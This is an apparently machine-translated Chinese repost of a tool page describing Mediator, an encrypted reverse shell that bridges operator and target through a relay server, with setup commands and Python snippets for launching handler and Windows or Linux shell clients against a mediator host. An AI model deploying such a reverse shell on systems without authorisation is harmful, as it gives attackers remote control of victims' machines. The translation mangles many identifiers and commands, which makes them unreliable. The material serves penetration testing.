# Mediator:一个可扩展的、端到端的加密反向外壳，采用了一种新颖的架构方法

> 原文：<https://kalilinuxtutorials.com/mediator-2/>

[![](img/b3cd93186ec250a350addc7a6d813149.png)](https://blogger.googleusercontent.com/img/a/AVvXsEjryxMNOJytn1YWTSi-ubC6-ihmOxobupe07gUgvahE0P1rTEQV40HMRqS4LkPlxLwzVtpgz3S6hrA30iujMWBX6bGi_PwtEmNHWERMO1pCcADC9n8O44zs92zvJbyNYaisficMZJfR1YFnK9DP562PfS7VyfemMIFBCxMiiryUO3PkVUtIPGEaYaF6=s1561)

**Mediator** 是一个端到端的加密反向 shell，其中操作者和 shell 连接到一个桥接连接的“Mediator”服务器。这消除了运营商/处理者为了监听连接而设置端口转发的需要。Mediator 还允许您创建插件来扩展反向外壳的功能。

您可以将 Mediator 的脚本作为独立的可执行文件运行，也可以将其导入到其他 pentesting 和事件响应工具中。

**建筑**

受端到端加密聊天应用程序的启发，Mediator 采用了一种独特的方法来实现反向外壳的客户端/服务器模型。中介使用:

*   客户端反向外壳
*   客户处理员/操作员
*   连接两个连接的服务器

反向 shells 和处理程序使用连接密钥连接到中介服务器。服务器在端口 80 监听处理程序连接，在端口 443 监听反向 shell 连接。当客户端连接到中介时，服务器根据客户端各自的类型和连接密钥对客户端进行排队。当反向 shell 和操作符都使用相同的密钥连接到服务器时，服务器将桥接这两个连接。在那里，两个客户机之间进行密钥交换，反向 shell 和 operator 之间的所有通信都是端到端加密的。这确保了服务器不能窥探它正在传输的流。

**外挂**

插件允许您添加额外的命令，这些命令可以在运营商的主机、目标主机或两者上执行代码！有关插件的更多信息，请参考插件目录中的自述文件。

**指令**

**服务器**

客户端脚本可以在 Windows 或 Linux 上运行，但是您需要在 Linux 主机上安装服务器(mediator.py)。服务器是纯 Python，所以不需要安装依赖项。您可以使用以下命令运行服务器脚本

**$ python3 mediator.py**

或者，您可以使用提供的 Docker 文件构建 Docker 映像，并在容器中运行它(确保发布端口 80 和 443)。

**客户**

您需要安装 requirements.txt 中的依赖项，以便客户端能够工作。您可以使用以下命令来完成此操作:

**$ pip 3 install-r requirements . txt**

请参见底部的*提示和提醒*,获得关于分发客户端的帮助，而无需担心依赖性。

处理程序和反向 shell 可以在其他 Python 脚本中使用，也可以直接通过命令行使用。在这两种情况下，客户端都可以接受服务器地址和连接密钥的参数。这些参数的用法如下所述。

**中介服务器地址**

对于 *Python 脚本*的用法，在实例化时需要中介主机的地址:

*处理程序类*

**从处理程序导入处理程序
operator = Handler(mediator host = " example . com ")
operator . run()**

*windows shell 类*

**从 windowsTarget 导入 windows rshell
shell = windows rsshell(mediator host = " example . com ")
shell . run()**

如果直接从 shell 执行客户端脚本*，您可以将地址硬编码在脚本的底部，或者可以将服务器地址指定为带有`**-s**`或`**--server**`标志的参数:*

*handle . py*

**$ python 3 handler . py-s example.com**

*windowsTarget.py*

**python windows target . py-s example.com**

**连接密钥**

当两个处理程序或两个反向 shells 使用相同的连接键连接到中介服务器时，只有第一个连接排队等待匹配。在排队的连接超时(30 秒)或与对应的连接匹配之前，尝试使用相同连接密钥进行连接的所有其他相同类型的客户端都将被丢弃。

重要的是要确保每个处理程序都使用唯一的连接密钥，以避免竞争情况导致错误的 shell 被提供给操作符。

仅前缀为“#”的键！ConnectionKey_ "将被服务器接受。默认的连接密钥是“#！ConnectionKey_CHANGE_ME！！!"。

要更改用于 *Python 脚本*用途的连接密钥，可以选择在实例化时提供连接密钥:

*处理程序类*

**从处理程序导入处理程序
operator = Handler(mediator host = " example . com "，connectionKey="#！connection key _ secret _ key ")
operator . run()**

*Linux shell 类*

**从 linuxTarget 导入 Linux rshell
shell = Linux rshell(mediator host = " example . com "，connectionKey="#！connection key _ secret _ key ")
shell . run()**

如果直接从 shell 中执行客户端脚本*，您可以在脚本底部硬编码连接密钥，也可以使用`**-c**`或`**--connection-key**`标志将连接密钥指定为参数:*

*handle . py*

**$ python 3 handler . py-s example.com-c ' #！连接密钥 _ 秘密密钥'**

*windowsTarget.py*

**python windows target . py-s example.com-c ' #！连接密钥 _ 秘密密钥'**

[**Download**](https://github.com/lawndoc/mediator)